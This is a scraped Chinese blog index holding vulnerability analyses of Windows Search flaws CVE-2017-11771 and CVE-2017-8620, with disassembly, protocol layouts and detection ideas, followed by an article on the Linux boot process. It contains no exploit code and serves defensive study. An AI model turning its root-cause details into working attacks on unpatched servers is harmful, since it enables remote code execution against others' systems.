+ cbReversed resultDataEnd = buffer + cbReadBuffer 如果计算出的resultDataEnd不是8字节对齐的，则函数一次从resultDataEnd减去一个字节，直到对齐为止。 但是，在返回分配的buffer前，函数没有对resultDataEnd是否大于等于resultDataStart进行验证，直接调用了CFixedVarBufferAllocator::CFixedVarBufferAllocator()函数进行初始化buffer的chunk分配。AllocFixed()函数使用下面的方式来确认buffer中是否有足够空间： resultDataEnd - resultDataStart \u003c cbRowWidth 因为CFixedvarBufferAllocator()没有进行两个字段大小的比较，所以有可能会出现resultDataEnd小于resultDataStart的情况，这样当两个字段进行减法运算的时候就会造成溢出。然后会调用AllocFixed()函数进行内存分配，但是此时的buffer的offset有可能是错误的。当row被复制到分配的chunk时，数据会被写到buffer的末尾，最终导致一个堆溢出。 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:3","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"4. 源码分析 # CRequestServer::DoGetRows(): .text:62A6912A mov eax, [esi+20h] ; cbReserved .text:62A6912D mov edi, [esi+24h] ; cbReadBuffer [......] .text:62A6915F cmp eax, edi .text:62A69161 jb loc_62AA21B3 ; ensure cbReserved \u003c cbReadBuffer [......] .text:62A691DE push [ebp+cbReserved] ; cbReserved .text:62A691E1 lea ecx, [ebp+fixedVarBuffer] ; this .text:62A691E7 push ebx ; cbRowWidth .text:62A691E8 push edi ; cbReadBuffer .text:62A691E9 push [ebp+clientBase] ; clientBase .text:62A691EC push esi ; base of message .text:62A691ED call ??0CFixedVarBuff... ; CFixedVarBufferAllocator() # CFixedVarBufferAllocator::CFixedVarBufferAllocator(): .text:62A68413 mov ecx, [ebp+msgBase_arg0] .text:62A68416 push ebx .text:62A68417 mov dword ptr [eax+8], offset ??_7PFixedA... .text:62A6841E push esi .text:62A6841F mov esi, [ebp+cbReserved_arg10] .text:62A68422 mov [eax+14h], edx .text:62A68425 lea edx, [esi+ecx] ; resultDataStart .text:62A68428 mov [eax+18h], edx .text:62A6842B mov edx, [ebp+cbReadBuffer_arg8] .text:62A6842E xor ebx, ebx .text:62A68430 add edx, ecx ; resultDataEnd .text:62A68432 test ecx, ecx .text:62A68434 push edi .text:62A68435 mov edi, [ebp+cbRowWidth_argC] .text:62A68438 setnz bl .text:62A6843B mov [eax+20h], edi .text:62A6843E pop edi .text:62A6843F mov [eax+24h], esi .text:62A68442 pop esi .text:62A68443 mov dword ptr [eax], offset ??_7CFixedVar... .text:62A68449 mov dword ptr [eax+8], offset ??_7CFixedV... .text:62A68450 mov [eax+4], ebx .text:62A68453 mov [eax+0Ch], ecx .text:62A68456 mov [eax+10h], ecx .text:62A68459 mov [eax+1Ch], edx .text:62A6845C pop ebx .text:62A6845D test dl, 7 ; check if resultDataEnd is 8-byte aligned .text:62A68460 jnz loc_62AA20DA .text:62A68466 pop ebp ; fails to validate resultDataEnd \u003e= resultDataStart .text:62A68467 retn 14h [......] .text:62AA20DA dec dword ptr [eax+1Ch] ; subtract resultDataEnd .text:62AA20DD test byte ptr [eax+1Ch], 7 ; check alignment .text:62AA20E1 jz loc_62A68466 .text:62AA20E7 jmp short loc_62AA20DA # CFixedVarBufferAllocator::AllocFixed(): .text:62A745B0 mov edi, edi .text:62A745B2 push ebp .text:62A745B3 mov ebp, esp .text:62A745B5 mov eax, [ecx+10h] .text:62A745B8 mov edx, [ecx+18h] .text:62A745BB sub esp, 20h .text:62A745BE push esi .text:62A745BF mov esi, [ecx+14h] .text:62A745C2 sub esi, eax ; resultDataEnd - resultDataStart .text:62A745C4 cmp edx, esi ; compare above difference to cbRowWidth .text:62A745C6 ja loc_62AA20E9 .text:62A745CC add edx, eax ; add cbRowWidth to resultDataStart .text:62A745CE mov [ecx+10h], edx .text:62A745D1 pop esi .text:62A745D2 leave .text:62A745D3 retn ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:4","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"5. 攻击流量 SMB1: SMB2: ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:5","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"6. PoC分析 首先进行了前期的验证工作，例如创建命名管道，建立查询连接，判断文件夹是否处于共享访问。按照查询流程依次进行数据发送，来到GetRowsIn消息： ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:6","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"四、漏洞检测和防御 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:4:0","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞检测 暂无。 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:4:1","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. 漏洞防御 1. 检测思路 首先监控通过SMB建立MsFtewds命名管道的操作，然后使用byte_math检测出现漏洞的字段 2. 可能存在的风险 SMBandx命令有链式结构，可以嵌套，容易产生绕过。 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:4:2","tags":["漏洞"],"title":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"CVE-2017-8620 Windows Search远程代码执行漏洞简单分析 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:0:0","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:0","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows Search Remote Code Execution Vulnerability 漏洞编号：CVE-2017-8620；Bugtraq ID：100034 漏洞类型：Remote Code Execution ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:1","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"2. 组件概述 Windows搜索是一个桌面搜索平台，具有针对大多数常见文件类型和数据类型的即时搜索功能。 它的主要组件是WSearch Windows Service，它负责索引，组织和提取有关本地文件系统的信息。 此外，它实现了通用搜索服务（GSS），它是向搜索查询提供结果所需的后端功能。 客户端使用Windows搜索协议（WSP）向托管GSS的服务器发出查询。 WSP依靠名为管道协议的服务器消息块（SMB）进行消息传输和身份验证。 Microsoft Windows的所有版本均附带服务器消息块（SMB）协议的实现。 SMB是本机Windows网络框架，支持文件共享，网络打印，远程过程调用和其他功能。在Windows系统上，SMB协议通过附加的安全性，文件和磁盘管理支持扩展了CIFS协议。 通过各种SMB命令和子命令类型提供这些功能。 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:2","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"3. 漏洞概述 Windows搜索处理内存中的对象时，存在远程执行代码漏洞，成功利用此漏洞的攻击者可以控制受影响的系统。虽然漏洞与SMB协议本身无关，但攻击者可SMB目标作为攻击媒介，因此该漏洞面临着与Wannacry类似的大规模利用风险。CNVD对该漏洞的技术评级为“高危”。 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:3","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"4. 漏洞影响版本 • Microsoft Windows 10 for 32-bit Systems • Microsoft Windows 10 for x64-based Systems • Microsoft Windows 2012 R2 • Microsoft Windows 8.1 for 32-bit Systems • Microsoft Windows 8.1 for x64-based Systems • Microsoft Windows RT 8.1 • Microsoft Windows Windows 7 for 32-bit Systems Service Pack 1 • Microsoft Windows Windows 7 for x64-based Systems Service Pack 1 • Microsoft Windows Server 2008 for 32-bit Systems SP 2 (Server Core) • Microsoft Windows Server 2008 for 32-bit Systems SP2 • Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2 • Microsoft Windows Server 2008 for x64-based systems • Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1 • Microsoft Windows Server 2012 R2 • Microsoft Windows Server 2012 R2 (Server Core) • Microsoft Windows Server 2016 • Microsoft Windows Server 2016 Server Core ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:4","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"5. 解决方案 获取该漏洞补丁，地址：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8620 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:1:5","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:2:0","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:0","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"1. 漏洞基本信息 漏洞文件：tquery.dll 漏洞函数：CRegXpr::CRegXpr() 漏洞对象：一个CPropertyRestriction结构，其prval具有与VT_LPWSTR的vType混淆的VT_LPWSTR以外的vType。 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:1","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"2. 背景知识 备注：此处略去SMB相关介绍，漏洞自身与SMB关系不大，SMB只是作为WSP传输的工具协议，使用的pipe名称为MsFteWds。 Windows Search Protocol(WSP) 使用WSP的最小搜索查询其流程大概如下： [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectIn消息开始于客户端和服务器之间的会话，CPMCreateQueryIn包含查询条件并创建新查询，CPMSetBindingsIn指定如何在CPMGetRowsOut中构建搜索结果，CPMGetRowsIn从服务器返回的查询结果中请求数据。 所有的WSP消息以一个16字节的头部开始，其结构如下： Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msg字段标识标头部后面的消息类型（有的一个value表示两种类型，此时要根据数据流的传输方向判定具体代表哪种类型。带\"In\"字符的是从client到server，带\"Out\"字符的是从server到client）； _status字段表明所请求操作的状态，由服务器填充； _ulChecksum包含从_ulReserved2字段后面开始的消息的校验和； _ulReserved2字段除了后续的消息为CPMGetRowsIn之外，都必须设置为0。 跟本漏洞相关的是CPMCreateQueryIn消息， 此消息创建一个新的搜索查询，其结构如下： Offset Size (bytes) Field -------------------------------------------------------------------- 0x00 0x4 Size 0x04 0x1 CColumnSetPresent 0x05 0x3 paddingCColumnSet 0x08 var (w) ColumnSet 0x08 + w 0x1 CRestrictionPresent 0x09 + w var (x) RestrictionArray 0x09 + w + x 0x1 CSortSetPresent 0x0a + w + x 0x3 paddingCCortSet 0x0d + w + x var (y) SortSet 0x0d + w + x + y 0x1 CCategorizationSetPresent 0x0e + w + x + y 0x3 paddingCCategorizationSet 0x11 + w + x + y var (z) CCategorizationSet 0x11 + w + x + y + z 0x14 RowSetProperties 0x25 + w + x + y + z var (m) PidMapper 0x25 + w + x + y + z + m var (n) GroupArray 0x25 + w + x + y + z + m + n 0x4 Lcid 从上面的结构中可以看出，有很多字段数值大小不是固定的，这对后续的流量监测造成很大困难。 在上面的结构中，需要重点关注的字段是CRestrictionPresent和RestrictionArray。 前者标识了RestrictionArray字段是否存在（CRestrictionPresent为0时，RestrictionArray字段不能存在；CRestrictionPresent字段为非0时，RestrictionArray字段必须存在），后者包含描述查询命令树的CRestrictionArray结构。 命令树是为搜索查询指定的限制条件和排序顺序的组合。 CRestrictionArray的详细结构如下： Offset Size(bytes) Field ------------------------------------------- 0x00 0x1 count 0x01 0x1 isPresent 0x02 0x3 padding 0x05 var Restriction count字段表明Restriction字段中包含CRestriction的数量，该字段必须设置为0x01； isPresent字段标识Restriction字段是否存在是否包含CRestriction结构，值为0（省略）或1（不省略）； CRestriction指示用于命令树节点的限制类型，类型决定了在该结构的\"Restriction\"字段中找到的内容，格式如下： Offset Size(bytes) Field ------------------------------------------ 0x00 0x4 ulType 0x04 0x4 Weight 0x08 var Restriction ulType标识Restriction字段中存在的限制结构的类型。 此漏洞涉及具有指定CPropertyRestriction的ulType为RTProperty(0x5)的CRestrictions。 某些CRestriction类型可以包含嵌套的CRestrictions，形成一个限制树。因此，CPropertyRestriction可以嵌入以下任何限制条件中： RTAnd (0x1), Restriction contains a CNodeRestriction structure RTOr (0x2), Restriction contains a CNodeRestriction structure RTNot (0x3), Restriction contains a CRestriction structure RTProximity (0x6), Restriction contains a CNodeRestriction structure RTVector (0x7), Restriction contains a CVectorRestriction structure RTCoerce_Add (0xA), Restriction contains a CCoercionRestriction structure RTCoerce_Multiply (0xB), Restriction contains a CCoercionRestriction structure RTCoerce_Absolute (0xC), Restriction contains a CCoercionRestriction structure RTPhrase (0x00FFFFFD), Restriction contains a CNodeRestriction structure 上述列表中的限制具有以下结构： CNodeRestriction: Offset Size（bytes) Field ---------------------------------------------------------------- 0x00 0x4 cNode (number of structures in paNode) 0x04 var paNode (array of CRestriction structures) CVectorRestriction: Offset Size (bytes) Field ------------------------------------------------------------ 0x00 var (n) pres (CNodeRestriction structure) 0x00 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:2","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"3. 详细分析 当运行了GSS服务的server接受到CPMCreateQueryIn消息时，会解析RestrictionArray并为每个限制条件实例化相关对象。如果服务解析的是一个响应CPropertyR etriction的CRestriction，此时ulType的值为0x5，则解组prval字段并实例化CBaseStorageVariant对象。如果CPropertyRestriction的relop字段的值为0x6，表示采用的操作是正则表达式比较，则服务开始将正则表达式解析为确定性有限自动机（DFA）。 但是，在解析正则表达式之前，服务未能成功验证prval字段中的CBaseStorageVariant对象的类型是否为VT_LPWSTR。如果类型不是VT_LPWSTR，则会发生类型混淆。 远程未经身份验证的攻击者可以通过向目标服务器发送恶意CPMCreateQueryIn消息来利用这些漏洞。成功利用可能会导致在SYSTEM上下文中的目标服务器上执行远程代码。 需要注意，SMB和WSP中的所有多字节整数都以little-endian字节顺序存储 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:3","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"4. 源码分析 使用IDA反编译存在漏洞的文件： tquery.dll version 7.0.7601.23861 # CPropertyRestriction::CPropertyRestriction(long, class PDeSerStream \u0026): .text:6EC88B61 push ebx ; struct PDeSerStream * .text:6EC88B62 lea ecx, [ebp+var_20] .text:6EC88B65 call ?SetLPWSTR@CStorageVariant@@QAEXPBGI@Z ; 开始进行prval解组 .text:6EC88B6A push eax .text:6EC88B6B mov ecx, edi .text:6EC88B6D mov byte ptr [ebp+var_4], 3 .text:6EC88B71 call ??4CStorageVariant... ; CStorageVariant::operator= # Parse(const struct CRestriction *, struct CTimeLimit *): .text:6ED350B3 cmp eax, 6 ; eax contains relop, check if relop indicates regexp .text:6ED350B6 jnz short loc_6ED350DE .text:6ED350B8 push 40h ; unsigned int .text:6ED350BA call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED350BF mov [ebp+arg_0], eax .text:6ED350C2 mov ecx, [esi+14h] .text:6ED350C5 mov edx, [esi+10h] .text:6ED350C8 push ecx .text:6ED350C9 push edx .text:6ED350CA push [ebp+arg_4] .text:6ED350CD mov ecx, eax .text:6ED350CF push esi .text:6ED350D0 mov byte ptr [ebp+var_4], 7 .text:6ED350D4 call ??0CRegXpr@@QA... ; CRegXpr(), 解析正则表达式 # CRegXpr::CRegXpr(class CInternalPropertyRestriction *, class CTimeLimit \u0026, unsigned long, unsigned long): .text:6ED37ABC push 0A8h ; unsigned int .text:6ED37AC1 call ?ciNew@@YGPAXI@Z ; ciNew(uint) .text:6ED37AC6 mov [ebp+var_7C], eax .text:6ED37AC9 push [ebp+var_78] ; int .text:6ED37ACC mov ecx, [esi+20h] .text:6ED37ACF push 0 ; int .text:6ED37AD1 push [ebp+arg_4] ; int .text:6ED37AD4 mov byte ptr [ebp+var_4], 6 .text:6ED37AD8 push ecx ; unsigned __int16 * .text:6ED37AD9 mov ecx, eax .text:6ED37ADB call ??0CDFA@@Q... ; CDFA::CDFA(), 直接进行vValue解析，并没有进行类型检查 # CNFA::CNFA(unsigned __int16 *, int, int): .text:6AF2781E mov dx, [eax] ; eax 指向 VT_LPWSTR .text:6AF27821 inc eax .text:6AF27822 inc eax .text:6AF27823 cmp dx, di .text:6AF27826 jnz short loc_6AF2781E ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:4","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"5. 攻击流量 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:3:5","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["Vuln"],"content":"四、漏洞检测和防御 根据漏洞原理，需要对SMB、WSP的诸多命令和结构进行遍历，且WSP命令中存在诸多变量字段，数值和长度无法确定，故很难在流量侧进行防御。 ","date":"2020-10-16","objectID":"/2020/10/cve-2017-8620/:4:0","tags":["漏洞"],"title":"CVE-2017-8620  Windows Search远程代码执行漏洞简单分析","uri":"/2020/10/cve-2017-8620/"},{"categories":["LINUX"],"content":"Linux开机引导和启动过程详解","date":"2020-10-13","objectID":"/2020/10/boot/","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"Linux开机引导和启动过程详解 ","date":"2020-10-13","objectID":"/2020/10/boot/:0:0","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"一、概述 操作系统的启动过程本质上分为2个阶段：boot（引导）阶段和startup（启动）阶段。引导阶段开始于打开电源剋管，结束于内核初始化完成和systemd进程成功运行；启动阶段接管了剩余的其他的工作，一直到OS进入可操作状态。其涵盖的内容可以用下图表示： 本文主要以GRUB和systemd为载体，尽可能详细地描述OS的引导和启动过程。 ","date":"2020-10-13","objectID":"/2020/10/boot/:1:0","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"二、引导过程 引导过程的初始化可以通过2种方式实现：关机状态下的电源开启，开机状态的OS重启。其过程主要有以下几个阶段： ","date":"2020-10-13","objectID":"/2020/10/boot/:2:0","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"1. 硬件启动流程 1. BIOS上电自检（POST） BIOS的第一步是上电自检，检查硬件的基本功能是否正常。如果POST失败，那么引导过程失败，电脑启动失败。POST检查成功后，产生一个BIOS中断 – INT 13H，该中断指向某个接入的可引导设备的引导扇区。它所找到的包含有效的引导记录的第一个引导扇区将被装在到内存0x7c00处，并且控制权也将从引导扇区转移到此段代码。也就是说，该中断指向的中断服务程序实际上就是磁盘服务程序，其主要用途就是将指定扇区的代码加载到内存的指定位置。 BIOS中包含了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性等，因此BIOS信息对于计算机来说十分重要。只有顺利通过BIOS自检，计算机才能继续后续流程，知道应该去读取哪个硬件设备。在BIOS将OS的控制权交给硬盘的第一个扇区后，就开始由Linux来控制系统了。 2. 读取MBR POST结束后，BIOS会在接入的磁盘中查找引导记录，其通常位于MBR，它加载它找到第一个引导记录到内存中，并开始执行代码。MBR是磁盘上第0磁道的第一个扇区 – Master Boot Record，大小为512字节，里面存放了预启动信息、分区表信息，总体可分为2部分：第一部分为引导（PRE-BOOT）区，大小为446字节，其内容为引导代码，这446字节的文件通常被叫做引导镜像(boot.img)；第二部分为分区表（PARTITION PABLE），大小为66字节，记录硬盘分区信息。（MBR的详细描述可见文章MBR详述） 系统找到BIOS指定的磁盘的MBR后，就将其复制到0x7c00地址所处的物理内存中。这里被复制的内容，就是boot loader，常见的有lilo，grub，grub2等。 由于这一阶段的引导代码的空间只有446字节，所以无法完成理解文件系统结构等功能，因此需要再找一个位于引导记录和设备第一个分区之间的位置来实现更多功能。而这个位置，就是boot loader所在位置。 ","date":"2020-10-13","objectID":"/2020/10/boot/:2:1","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"2. Boot Loader启动引导阶段 boot loader是在OS内核运行之前运行的一段小程序。通过这段小程序，可以初始化硬件设备、建立内存空间的映射图等，从而将系统的软硬件环境设置完备，为OS内核做好一切准备工作。 1. Stage 1 Stage1阶段所执行的代码为在执行系统安装时就预先写入到MBR的Boot Loader中的代码，其主要作用是将磁盘0磁道第2扇区的内容读入内存并执行，它是Stage 1.5阶段或Staget 2阶段的入口。 2. Stage 1.5 由于一些历史技术原因，在第一个分区的开始位置在扇区63和MBR之间遗留了62个512字节的扇区（总计31744字节）。该区域就可以用于存储完善功能的实现代码core.img，大小为25389字节。此时，该空间中可以容纳一些通用的文件系统驱动程序，如标准的ext，fat等。 Stage 1.5阶段是Stage 1阶段和Stage 2阶段的中间桥梁。Stage 1.5阶段具有识别启动分区文件系统的能力，此后GRUB程序便有能力去访问/boot分区下/grub目录下的Stage 2文件，并将Stage 2载入内存执行。 3. Stage 2 Stage 2阶段时，所有的文件都已存放在/boot/grub目录及其子目录下。Stage 2阶段执行时，首先会解析GRUB程序的配置文件grub.conf，并依配置文件决定是否显示系统启动菜单（列出可被加载执行的内核列表）。然后加载内核镜像到内存中，通过initrd程序建立Ramdisk内存虚拟根文件系统。此时控制权将转交给内核程序。 以上各个Stage中GURB和MBR的情况如下图： ","date":"2020-10-13","objectID":"/2020/10/boot/:2:2","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"3. 内核引导流程 内核引导阶段主要通过在内存中建立虚拟根文件系统实现相关设备的驱动并建立和切换到真正的根文件系统。内核文件均以一种自解压的压缩格式存储以节省空间，它与一个初始化的内存映像和存储设备映射表都存储于/boot目录下。 在选定的内核加载到内存中并开始执行后，在其进行任何工作之前，内核文件首先必须从压缩格式解压自身，此时屏幕一般会输出“Uncom pressing Linux”的提示，当解压缩完成后，输出“OK, booting the kernel”。 解压内核镜像加载到内存，以及initrd程序建立Ramdisk内存虚拟根文件系统后，内核开始驱动基本硬件，并调用虚拟根文件系统中的init程序加载驱动模块初始化系统中各种设备的相关配置工作，其中包括CPU、I/O、存储设备等。当所需的驱动程序加载完后，会根据grub.conf配置文件中“root=XXX”部分所指定的内容创建一个根设备，然后将根文件系统以只读的方式挂载，并切换到真正的根文件系统上，同时调用系统进程的老祖宗进程/sbin/init程序，进入系统初始化阶段。 这里涉及到一个关键函数：start_kernel()函数（后续将单独出一篇文章进行该函数的调试），它主要执行了以下操作： 在屏幕上打印出当前的内核版本信息。 执行setup_arch()，对系统结构进行设置。 执行sched_init()，对系统的调度机制进行初始化。先是对每个可用CPU上的runqueque进行初始化;然后初始化0号进程(其task struct和系统空M堆栈在startup_32()中己经被分配)为系统idle进程，即系统空闲时占据CPU的进程。 执行parse_early_param()和parsees_args()解析系统启动参数。 执行trap_in itQ，先设置了系统中断向量表。0－19号的陷阱门用于CPU异常处理;然后初始化系统调用向量;最后调用cpu_init()完善对CPU的初始化，用于支持进程调度机制，包括设定标志位寄存器、任务寄存器、初始化程序调试相关寄存器等等。 执行rcu_init()，初始化系统中的Read-Copy Update互斥机制。 执行init_IRQ()函数，初始化用于外设的中断，完成对IDT的最终初始化过程。 执行init_timers(), softirq_init()和time_init()函数，分别初始系统的定时器机制，软中断机制以及系统日期和时间。 执行mem_init()函数，初始化物理内存页面的page数据结构描述符，完成对物理内存管理机制的创建。 执行kmem_cache_init(),完成对通用slab缓冲区管理机制的初始化工作。 执行fork_init()，计算出当前系统的物理内存容量能够允许创建的进程(线程)数量。 执行proc_caches_init(), bufer_init(), unnamed_dev_init() ,vfs_caches_init(), signals_init()等函数对各种管理机制建立起专用的slab缓冲区队列。 执行proc_root_init()函数，对虚拟文件系统/proc进行初始化。 在start_kenrel()的结尾，内核通过kenrel_thread()创建出第一个系统内核线程(即1号进程)，该线程执行的是内核中的init()函数，负责的是下一阶段的启动任务。最后调用cpues_idle()函数:进入了系统主循环体口默认将一直执行default_idle()函数中的指令，即CPU的halt指令，直到就绪队列中存在其他进程需要被调度时才会转向执行其他函数。此时，系统中唯一存 在就绪状态的进程就是由kerne_hread()创建的init进程(内核线程)，所以内核并不进入default_idle()函数，而是转向init()函数继续启动过程。 完成以上过程后，Linux内核已可以正常运行。 ","date":"2020-10-13","objectID":"/2020/10/boot/:2:3","tags":["Boot"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["LINUX"],"content":"4. 系统初始化流程 该步骤主要完成通过/sbin/init,init程序准备软件运行坏境，启动系统服务 通过/etc/inittab文件确定运行级别，然后去执行系统初始化脚本/etc/rc.sysinit,为用户初始化用户空间环境，在完成初始化后，根据运行级别，系统开始对应级别的目录启动服务，关闭那些不要的服务（里面S99local -\u003e ../rc.local）用户自动服务启动脚本。 关键文件详解 1. 系统启动级别：/etc/inittab文件 # inittab is only used by upstart for the default runlevel. # # ADDING OTHER CONFIGURATION HERE WILL HAVE NO EFFECT ON YOUR SYSTEM. # # System initialization is started by /etc/init/rcS.conf # # Individual runlevels are started by /etc/init/rc.conf # # Ctrl-Alt-Delete is handled by /etc/init/control-alt-delete.conf # # Terminal gettys are handled by /etc/init/tty.conf and /etc/init/serial.conf, # with configuration in /etc/sysconfig/init. # # For information on how to write upstart event handlers, or how # upstart works, see init(5), init(8), and initctl(8). # # Default runlevel. The runlevels used are: # 0 - halt (Do NOT set initdefault to this) 关机 # 1 - Single user mode 单用户模式，root用户，无需认证，维护模式； # 2 - Multiuser, without NFS (The same as 3, if you do not have networking)， 多用户模式，会启动网络功能，但是不会启动NFS，维护模式； # 3 - Full multiuser mode 完全功能模式，文本界面； # 4 - unused 预留 # 5 - X11 完全功能模式，图形界面，此处使用的图形界面为X11 # 6 - reboot (Do NOT set initdefault to this) 重启 # id:3:initdefault: 2. 系统初始化脚本：/etc/rc.d/rc.sysinit 该文件在各个不同的发布版本中存在不同，此处仅以centos作为样例进行解释。 /etc/rc.v/rc.sysinit主要的工作大概有以下几项： 获取网络环境和主机类型：读取网络设置文件/etc/sysconfig/network，获取主机名以及网关等网络环境； 测试与挂载内存设备/proc和USB设备/sys：除挂载内存设备外，还会主动检查系统上是否存在USB设备，如果有，则载入对应的驱动，并挂载USB的文件系统； 判断是否启动SELinux：SELinux，全称Security Enhance Linux套件，其主要作用是强化Linux操作环境的安全性； 周边设备的检查与PnP(Plug and Play）参数的测试：根据内核在开机时的检查结果（/proc/sys/kernel/modprobe）开始i 进行ide/scsi/network/audio等周边设备的检查，并利用已装在的kernel模块进行PnP设备的参数测试； 载入用户自定义模块：用户可以在/etc/sysconfig/modules/*.modules设置要加载的模块； 载入内核的相关设置：系统会主动读取/etc/sysctl.conf的内容，根据其配置设置内核各选项； 设置系统时间； 设置console样式； 设置RAID和LVM等功能； 使用fsck进行磁盘文件系统检查； 进行磁盘容量quota的转换（非必要）； 重新以可读模式挂载系统磁盘； 启动quota功能； 启动系统随机装置（产生随机数功能）； 清除开机过程中的缓存内容； 